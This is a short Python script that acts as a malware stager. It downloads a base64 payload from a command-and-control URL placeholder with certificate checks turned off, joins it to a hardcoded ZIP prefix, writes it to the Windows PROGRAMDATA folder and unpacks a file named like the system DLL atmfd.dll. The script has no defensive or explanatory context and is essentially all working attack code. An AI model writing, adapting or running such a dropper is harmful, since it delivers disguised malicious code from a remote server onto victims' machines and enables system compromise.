import base64
import os
import zipfile
import io
import sys

try:
    import requests
except ImportError:
    print("Please install the 'requests' module: pip install requests")
    sys.exit(1)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

zip_prefix = bytearray([
    80, 75, 3, 4, 20, 0, 0, 0, 0, 0, 128, 163, 248, 90, 0, 0,
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 78, 84, 47, 80,
    75, 3, 4, 20, 0, 0, 0, 8, 0, 83, 76, 237, 82, 126, 44, 47,
    163, 167, 8, 3, 0, 8, 189, 5, 0, 12, 0, 0, 0, 78, 84, 47,
    97, 116, 109, 102, 100, 46, 100, 108, 108, 228, 92, 127, 124,
    83, 213, 21, 127, 201, 75, 104, 128, 194, 139, 252, 208, 170,
    168, 1, 131, 171
])

url = "{replace_Base64_hosted_C2_URL}"
output_zip_path = os.path.join(os.getenv("PROGRAMDATA"), "full_payload.zip")
extract_dir = os.path.join(os.getenv("PROGRAMDATA"), "NT")

def main():
    print("[*] Downloading base64 payload...")
    response = requests.get(url, verify=False)
    if response.status_code != 200:
        print("[!] Failed to download payload, status code:", response.status_code)
        return

    base64_data = response.text.strip()
    print("[*] Decoding base64 payload...")
    decoded_data = base64.b64decode(base64_data)

    print("[*] Combining ZIP prefix and payload...")
    full_zip = zip_prefix + bytearray(decoded_data)

    print("[*] Saving full ZIP to disk:", output_zip_path)
    with open(output_zip_path, "wb") as f:
        f.write(full_zip)

    print("[*] Extracting NT/ folder contents...")
    try:
        with zipfile.ZipFile(output_zip_path, "r") as z:
            members = z.namelist()
            nt_files = [m for m in members if m.startswith("NT/")]

            if not nt_files:
                print("[!] No files found in NT/ folder.")
                return

            for member in nt_files:
                z.extract(member, extract_dir)
                print("    Extracted:", member)

        print("[+] Extraction complete.")

    except zipfile.BadZipfile:
        print("[!] Error: Bad ZIP file.")

if __name__ == "__main__":
    main()
